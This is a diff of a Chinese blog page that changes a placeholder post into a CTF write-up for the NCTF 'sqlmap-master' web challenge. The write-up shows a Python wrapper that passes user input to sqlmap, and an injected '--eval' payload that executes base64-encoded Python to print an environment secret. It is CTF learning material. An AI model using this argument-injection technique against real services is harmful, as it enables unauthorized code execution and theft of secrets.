@@ -19,22 +19,24 @@
   <meta name="author" content="XU17">
   <meta name="keywords" content="">
   
-    <meta name="description" content="软件安全学习">
+    <meta name="description" content="NCTF2024-Pwn13ss wp">
 <meta property="og:type" content="article">
-<meta property="og:title" content="软件安全学习">
-<meta property="og:url" content="https://xu17.top/2024/01/01/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8/index.html">
+<meta property="og:title" content="NCTF2024-Pwn13ss wp">
+<meta property="og:url" content="https://xu17.top/2025/03/25/NCTF2025-Pwn13ss/index.html">
 <meta property="og:site_name" content="XU17">
-<meta property="og:description" content="软件安全学习">
+<meta property="og:description" content="NCTF2024-Pwn13ss wp">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2024-01-01T09:20:00.000Z">
-<meta property="article:modified_time" content="2025-03-16T11:00:11.195Z">
+<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202503251609132.png">
+<meta property="article:published_time" content="2025-03-24T17:00:00.000Z">
+<meta property="article:modified_time" content="2025-03-25T08:10:34.803Z">
 <meta property="article:author" content="XU17">
 <meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202503251609132.png">
   
   
   
-  <title>软件安全学习 - XU17</title>
+  <title>NCTF2024-Pwn13ss wp - XU17</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -219,13 +221,13 @@
   
 
 <div id="banner" class="banner" parallax=true
-     style="background: url('https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412281014683.jpg') no-repeat center center; background-size: cover;">
+     style="background: url('https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202503251609132.png') no-repeat center center; background-size: cover;">
   <div class="full-bg-img">
     <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="软件安全学习"></span>
+            <span id="subtitle" data-typed-text="NCTF2024-Pwn13ss wp"></span>
           
         </div>
 
@@ -236,8 +238,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-01-01 17:20" pubdate>
-          2024年1月1日 下午
+        <time datetime="2025-03-25 01:00" pubdate>
+          2025年3月25日 凌晨
         </time>
       </span>
     
@@ -248,7 +250,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          21 字
+          209 字
         
       </span>
     
@@ -259,7 +261,7 @@
         
         
         
-          1 分钟
+          2 分钟
         
       </span>
     
@@ -305,12 +307,28 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">软件安全学习</h1>
+            <h1 id="seo-header">NCTF2024-Pwn13ss wp</h1>
             
             
               <div class="markdown-body">
                 
-                <h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="软件安全"><a href="#软件安全" class="headerlink" title="软件安全"></a>软件安全</h2><h3 id="利用栈缓冲区溢出漏洞并执行任意代码"><a href="#利用栈缓冲区溢出漏洞并执行任意代码" class="headerlink" title="利用栈缓冲区溢出漏洞并执行任意代码"></a>利用栈缓冲区溢出漏洞并执行任意代码</h3>
+                <p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202503251609132.png" srcset="/img/loading.gif" lazyload alt="image-20250325160908974"></p>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="sqlmap-master"><a href="#sqlmap-master" class="headerlink" title="sqlmap-master"></a>sqlmap-master</h3><ul>
+<li><p>思路比较清晰，要不就是闭合执行命令，要不就是使用sqlmap特有的参数，借此执行命令</p>
+</li>
+<li><p>本地调试脚本</p>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> subprocess<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run_sqlmap</span>():<br>    <span class="hljs-comment"># 获取用户输入的 URL</span><br>    url = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入要测试的 URL: &quot;</span>)<br>    <br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> url:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;错误: URL 是必填项&quot;</span>)<br>        <span class="hljs-keyword">return</span><br>    <br>    <span class="hljs-comment"># 构建命令</span><br>    command = <span class="hljs-string">f&#x27;sqlmap -u <span class="hljs-subst">&#123;url&#125;</span> --batch --flush-session&#x27;</span><br>    <br>    <span class="hljs-comment"># 打印完整的命令</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;完整的命令: <span class="hljs-subst">&#123;command&#125;</span>&quot;</span>)<br>    <br>    <span class="hljs-comment"># 打印分割后的命令</span><br>    split_command = command.split()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;分割后的命令: <span class="hljs-subst">&#123;split_command&#125;</span>&quot;</span>)<br>    <br>    <span class="hljs-comment"># 执行命令</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;正在执行命令...&quot;</span>)<br>    process = subprocess.Popen(<br>        split_command,<br>        stdout=subprocess.PIPE,<br>        stderr=subprocess.STDOUT,<br>        shell=<span class="hljs-literal">False</span><br>    )<br>    <br>    <span class="hljs-comment"># 实时输出命令执行结果</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        output = process.stdout.readline()<br>        <span class="hljs-keyword">if</span> output == <span class="hljs-string">b&#x27;&#x27;</span> <span class="hljs-keyword">and</span> process.poll() <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> output:<br>            <span class="hljs-built_in">print</span>(output.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>).strip())<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    run_sqlmap()<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202503241019196.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<ul>
+<li><code>payload</code></li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">http://localhost:<span class="hljs-number">8000</span>/?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span> --<span class="hljs-built_in">eval</span>=<span class="hljs-built_in">exec</span>(<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;base64&#x27;</span>).b64decode(<span class="hljs-string">&#x27;aW1wb3J0IG9zOyBwcmludChvcy5nZXRlbnYoJ0ZMQUcnKSk=&#x27;</span>))<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202503241019163.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+
                 
               </div>
             
@@ -328,7 +346,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/CTF-Learning/" class="category-chain-item">CTF-Learning</a>
+  <a href="/categories/CTF-Writeup/" class="category-chain-item">CTF-Writeup</a>
   
   
 
@@ -355,8 +373,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>软件安全学习</div>
-      <div>https://xu17.top/2024/01/01/软件安全/</div>
+      <div>NCTF2024-Pwn13ss wp</div>
+      <div>https://xu17.top/2025/03/25/NCTF2025-Pwn13ss/</div>
     </div>
     <div class="license-meta">
       
@@ -368,7 +386,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2024年1月1日</div>
+          <div>2025年3月25日</div>
         </div>
       
       
@@ -393,9 +411,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2024/01/01/pyjail%E5%AD%A6%E4%B9%A0/" title="pyjail学习">
+                      <a href="/2025/03/25/%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E8%B5%9B%E7%8E%B0%E5%9C%BA%E8%B5%9BWriteup/" title="软件系统安全赛`Writeup`+赛后复现">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">pyjail学习</span>
+                        <span class="hidden-mobile">软件系统安全赛`Writeup`+赛后复现</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -403,8 +421,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/03/19/Paper-Learing/" title="Paper-Learing">
-                        <span class="hidden-mobile">Paper-Learing</span>
+                      <a href="/2025/03/16/CVE-2024-2961%E5%AD%A6%E4%B9%A0/" title="CVE-2024-2961学习">
+                        <span class="hidden-mobile">CVE-2024-2961学习</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
